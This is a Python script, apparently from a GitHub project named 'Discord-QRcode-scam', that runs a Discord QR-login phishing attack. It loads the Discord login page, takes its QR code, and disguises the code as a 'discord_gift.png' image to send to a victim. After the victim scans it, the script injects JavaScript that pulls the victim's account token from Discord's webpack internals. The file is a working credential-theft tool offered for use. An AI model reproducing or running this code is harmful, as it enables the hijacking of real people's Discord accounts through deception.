from colorama import Fore, init
init()
from bs4 import BeautifulSoup
from selenium import webdriver
from PIL import Image
import base64, time, os
from banner import BANNER

# By Jupiter404E

def logo_qr():
    im1 = Image.open("temp/qr_code.png", "r")
    im2 = Image.open("temp/overlay.png", "r")
    im2_w, im2_h = im2.size
    im1.paste(im2, (60, 55))
    im1.save("temp/final_qr.png", quality=95)

def paste_template():
    im1 = Image.open("temp/template.png", "r")
    im2 = Image.open("temp/final_qr.png", "r")
    im1.paste(im2, (120, 409))
    im1.save("discord_gift.png", quality=95)

def main():
    print(BANNER)

    options = webdriver.ChromeOptions()
    options.add_experimental_option("excludeSwitches", ["enable-logging"])
    options.add_experimental_option("detach", True)

    driver = webdriver.Chrome(options=options, executable_path=r"chromedriver.exe")

    driver.get("https://discord.com/login")
    time.sleep(5)
    print("\n- Page loaded.")

    page_source = driver.page_source

    soup = BeautifulSoup(page_source, features="lxml")

    qr_code = soup.find("img")["src"]
    file = os.path.join(os.getcwd(), "temp\\qr_code.png")

    img_data =  base64.b64decode(qr_code.replace("data:image/png;base64,", ""))

    with open(file,"wb") as handler:
        handler.write(img_data)

    discord_login = driver.current_url
    logo_qr()
    paste_template()

    print("QR code is generated...")
    time.sleep(3)
    print("- QR code generated!\n> discord_gift.png")
    print("Send the QR code to the user. Wait for it to scan it...")
    while True:
        if discord_login != driver.current_url:
            driver.execute_script("""
            alert((webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken());
            """)
            break
    print("\nRate me!{} At https://github.com/Jupiter404E/Discord-QRcode-scam\n".format(Fore.WHITE))

if __name__ == "__main__":
    main()
